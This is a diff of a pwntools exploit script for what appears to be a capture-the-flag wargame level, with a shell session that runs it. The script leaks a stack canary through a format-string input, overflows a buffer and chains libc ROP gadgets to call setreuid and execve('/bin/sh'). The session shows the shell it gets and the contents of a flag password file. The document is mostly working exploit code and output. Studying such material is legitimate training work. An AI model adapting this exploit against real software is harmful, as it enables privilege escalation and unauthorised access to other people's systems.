@@ -1,7 +1,8 @@
+level07@rainfall:~$ cat exploit.py
 from pwn import *
 
 libc = 0x7ffff7c00000
-offset = 254
+offset = 72
 ret = libc + 0x28a92
 pop_rdi = libc + 0x10c08d
 pop_rsi = libc + 0x10f889
@@ -9,23 +10,26 @@ pop_rdx = libc + 0xb513c
 addr_execve = libc + 0xef030
 addr_exit = libc + 0x47ba0
 addr_shell = libc + 0x1cc42f
-addr_setreuid = libc + 0xd27370
+addr_setreuid = libc + 0x127370
 
 p = process('./sprawl')
 
 p.sendlineafter(b'[SPRAWL] Route tag: ', b'%23$p')
 p.recvuntil(b'[SPRAWL] Routing via ')
-data = p.recvuntil(b'[SPRAWL] Header (hex): ')
-leak_line = data.split(b'\n')[0]
-canary = int(leak_line, 16)
-p.sendline(b'deadbeef 0100 0000')
+leak = p.recvline().strip()
+canary = int(leak, 16)
+log.success(f"Canary: {hex(canary)}")
+
+p.sendlineafter(b'[SPRAWL] Header (hex): ', b'deadbeef 0100 0000')
+
+p.recvuntil(b'[SPRAWL] Transmit (')
+p.recvuntil(b' bytes): ')
 
 payload  = b'A' * offset
 payload += p64(canary)
 payload += b'B' * 8
 payload += p64(ret)
 
-# setreuid(1024, 1024)
 payload += p64(pop_rdi)
 payload += p64(1024)
 payload += p64(pop_rsi)
@@ -33,7 +37,6 @@ payload += p64(1024)
 payload += p64(0)
 payload += p64(addr_setreuid)
 
-# execve("/bin/sh", NULL, NULL)
 payload += p64(pop_rdi)
 payload += p64(addr_shell)
 payload += p64(pop_rsi)
@@ -48,5 +51,16 @@ payload += p64(0)
 payload += p64(addr_execve)
 payload += p64(addr_exit)
 
-p.sendlineafter(b'[SPRAWL] Transmit (0 bytes): ', payload)
+log.success("Payload: Ready")
+p.send(payload.ljust(256, b'C'))
+log.success("Payload: Sent")
 p.interactive()
+level07@rainfall:~$ python3 exploit.py 
+[+] Starting local process './sprawl': pid 6447
+[+] Canary: 0x8c1ac4f4b9d48800
+[+] Payload: Ready
+[+] Payload: Sent
+[*] Switching to interactive mode
+[SPRAWL] Packet 0 received. Checksum: 00000000
+$ cat /home/flag07/.pass
+s3cgzrg5q78t6xx73ljvm3m2zfwk02ix
